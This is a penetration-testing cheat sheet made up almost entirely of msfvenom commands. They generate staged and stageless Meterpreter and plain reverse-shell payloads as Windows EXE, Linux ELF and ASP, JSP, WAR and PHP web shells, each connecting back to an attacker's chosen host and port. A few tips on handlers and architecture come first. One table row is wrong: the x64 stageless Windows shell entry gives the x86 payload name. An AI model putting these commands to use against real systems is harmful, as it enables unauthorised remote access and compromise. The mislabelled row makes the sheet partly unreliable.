---
legal-banner: true
---

### **Common mistakes to avoid**

1.  Mismatched payloads  
2.  Trying to catch a staged shell without using the multi/handler  
3.  Architecture mismatch  
4.  Remember: 32-bit payloads don’t include the architecture in the name, but 64-bit payloads do (see below).  

### **Meterpreter binaries**

#### Staged payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Stageless payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Staged payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Stageless payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Meterpreter web payloads

| Format | Command |
| --- | --- |
| asp | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f asp > shell.asp` |
| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw > shell.jsp` |
| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f war > shell.war` |
| php | `msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw > shell.php` |

### **Non-Meterpreter binaries**

#### Staged payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Stageless payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Staged payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Stageless payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Non-Meterpreter web payloads

| Format | Command |
| --- | --- |
| asp | `msfvenom -p windows/shell/reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f asp > shell.asp` |
| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw > shell.jsp` |
| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f war > shell.war` |
| php | `msfvenom -p php/reverse_php LHOST=[IP-ADDRESS] LPORT=[PORT] -f raw > shell.php` |
